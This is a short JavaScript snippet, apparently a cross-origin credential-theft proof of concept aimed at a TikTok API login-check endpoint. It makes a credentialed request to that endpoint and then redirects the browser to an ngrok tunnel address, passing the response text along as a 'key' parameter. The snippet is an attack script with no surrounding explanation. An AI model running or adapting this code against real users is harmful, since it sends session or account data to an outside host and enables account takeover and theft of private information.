var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://api.tiktokv.com/check_login/?aid=1583&service=ads.tiktok.com&language=en&appId=1583&lang=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

function reqListener() {
    window.location='https://832a-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
};
